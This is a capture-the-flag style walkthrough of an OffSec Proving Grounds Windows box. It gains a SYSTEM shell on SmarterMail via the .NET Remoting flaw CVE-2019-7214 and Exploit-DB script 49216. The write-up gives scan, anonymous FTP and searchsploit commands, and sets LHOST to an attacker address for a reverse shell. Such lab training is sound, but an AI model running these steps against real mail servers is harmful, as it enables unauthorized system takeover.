
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Windows **Web Application:** SmarterMail (mail server with web management interface) **Initial Access:** Unauthenticated .NET Remoting RCE (CVE-2019-7214) **Initial Access Type:** Service exploitation **Privilege Escalation:** None required — SmarterMail service runs as SYSTEM **Final Access:** SYSTEM (direct)

### Key Techniques

- Full port + aggressive scan (`-p- -A`)
- Anonymous FTP enumeration
- SMB enumeration (dead end — access denied)
- IIS default install recognition
- Web source review for version disclosure
- searchsploit / Exploit-DB lookup by service name
- CVE research for a non-HTTP port (.NET Remoting)
- Exploit variable configuration and execution
- Root-owned/SYSTEM-owned service recognition

---

# Attack Path

```text
nmap -p- -A: 21, 80, 135, 139, 445, 9998, 17001
        ↓
Anonymous FTP — Download All Files (mget *)
        ↓
SMB — Access Denied (Dead End)
        ↓
Port 80 — Default IIS Install (Dead End)
        ↓
Port 9998 — SmarterMail Web Interface
        ↓
Default Creds Fail; Source Reveals Version Number
        ↓
Port 17001 — .NET Remoting Service
        ↓
Research: SmarterMail + .NET Remoting → CVE-2019-7214
        ↓
Exploit-DB PoC (49216.py)
        ↓
Configure HOST/PORT/LHOST/LPORT
        ↓
Listener + Exploit Execution
        ↓
Shell as SYSTEM (SmarterMail Runs as SYSTEM)
```

---

# 1. Nmap Enumeration

```bash
nmap -T4 -p- -A -oA scan-advanced <target>
```

```text
21/tcp     ftp      Microsoft ftpd — Anonymous login allowed
80/tcp     http     Microsoft IIS 10.0 (default install)
135/tcp    msrpc
139/tcp    netbios-ssn
445/tcp    microsoft-ds
9998/tcp   http     Microsoft IIS 10.0 — "SmarterMail" web interface
17001/tcp  remoting MS .NET Remoting services
```

A wide spread of services — worth working through systematically rather than fixating on the first thing found.

> [!tip] Recognition Pattern `-A` (aggressive scan: OS detection, version detection, script scanning, traceroute) combined with `-p-` up front is a reasonable default on Windows boxes where the interesting service is unpredictable — better to get full context in one scan than discover a critical port was missed later.

---

# 2. Service Enumeration

## FTP (21) — Anonymous access

```text
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

```bash
ftp <target>
# anonymous / (blank or anonymous)
mget *
```

Downloaded everything available — worth doing even without knowing yet whether the contents are useful, since it's a low-cost action.

## SMB (139/445) — Dead end

No anonymous share enumeration; access denied across the board. Confirmed and moved on rather than forcing it.

## HTTP (80) — Dead end

Default IIS installation page. Gobuster against it found nothing.

> [!tip] Recognition Pattern A default "IIS Windows" landing page with nothing behind it is common as a decoy/non-issue on Windows boxes — don't over-invest in brute-forcing a port that shows every sign of being an untouched default install once a reasonable scan comes back empty.

## HTTP (9998) — SmarterMail

A second, distinct web service — **SmarterMail**, a mail server product with its own web management interface.

```bash
searchsploit smartermail
```

Multiple hits. Commonly-cited default credentials (found via a quick search) don't work here — but reviewing the page's source code reveals a **version number** directly, which narrows the CVE search considerably.

> [!tip] Key Principle When default credentials fail, don't abandon the target — check the page source, response headers, and any client-side JS for version disclosure. A specific version number turns a broad "SmarterMail exploits" search into a precise CVE match.

## .NET Remoting (17001)

An unusual port/service worth researching directly rather than dismissing as noise:

- [SpeedGuide port reference for 17001](https://www.speedguide.net/port.php?port=17001)
- Repeated correlation in search results between this port, SmarterMail, and **remote code execution**

This leads to:

- CVE: [CVE-2019-7214](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7214)
- PoC: [Exploit-DB 49216](https://www.exploit-db.com/exploits/49216)

> [!tip] Recognition Pattern An unfamiliar port/service name is worth a direct search on its own — "port 17001" plus whatever context is already known (SmarterMail, in this case) is often enough to surface both what the port does and any known vulnerabilities tied to it, even without a clean Nmap service match.

---

# 3. Exploitation

```bash
searchsploit -m 49216
```

Edit the exploit's target variables:

```python
HOST='<target_ip>'
PORT=17001
LHOST='<attacker_ip>'
LPORT=80
```

Set up a listener matching `LPORT`, then run:

```bash
python3 49216.py
```

Shell received.

```bash
whoami
# SYSTEM (or equivalent — SmarterMail service context)
```

---

# 4. Post-Exploitation

The SmarterMail service runs under the **SYSTEM** account — meaning the initial exploit already delivers full administrative control of the host, with no privilege escalation phase required at all.

> [!tip] Recognition Pattern Mail servers, monitoring agents, and other Windows services that need broad filesystem/network access are frequently configured to run as SYSTEM rather than a scoped service account — landing a shell via such a service is often the entire engagement in one step. Always check `whoami` immediately after any foothold; if it's already SYSTEM/root, there's no privesc phase to chase.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Anonymous FTP allowed|Always test and download everything available — low cost, sometimes high value|
|Default web install (IIS, Apache, etc.) with nothing behind it|Don't over-invest — confirm briefly and move to other services|
|Default creds fail on a web panel|Check page source/headers for version disclosure before giving up|
|Unfamiliar port/service in Nmap output|Search it directly, combined with any other identified service context|
|Foothold service runs as SYSTEM/root|No privesc phase needed — check `whoami` immediately to confirm|

---

# Key Lessons

> [!tip] Work Through Every Open Port Systematically A box with many open services (FTP, two HTTP instances, SMB, .NET Remoting) rewards methodically checking each rather than fixating on the first interesting-looking one — the actual vulnerable service here (.NET Remoting on 17001) wasn't the obvious web app on port 80 or even 9998 directly, but a third, less conventional port.

> [!tip] Version Disclosure Recovers a Stalled Default-Creds Attempt When default credentials don't work, page source and headers are the next stop — a version number is often sitting in plain view and turns a vague "exploits for this product" search into an exact CVE match.

> [!tip] Research Unfamiliar Ports Directly A port with no clean Nmap service fingerprint is still worth researching by number, especially combined with any other services already identified on the box — cross-referencing often surfaces the exact CVE.

> [!tip] Always Check Whether You're Already Done A shell landing as SYSTEM or root means the engagement's privilege-escalation phase is already complete. Confirm with `whoami` immediately rather than assuming further escalation is always necessary.